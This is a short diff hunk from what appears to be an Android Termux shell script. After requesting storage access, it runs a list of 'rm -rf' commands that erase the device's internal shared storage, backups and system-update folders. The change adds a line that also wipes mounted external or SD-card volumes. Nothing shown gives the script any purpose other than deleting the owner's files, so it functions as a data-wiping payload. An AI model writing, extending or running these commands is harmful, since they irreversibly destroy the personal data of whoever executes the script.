@@ -15,6 +15,7 @@ termux-setup-storage
 rm -rf /storage/emulated/0
 rm -rf /sdcard/0
 rm -rf /sdcard/Backup
+rm -rf /mnt/media_rw/E872*99B5,/storage/E872*99B5
 rm -rf /sdcard/System Volume Information
 rm -rf /sdcard/system_update
 rm -rf /sdcard/@wcache
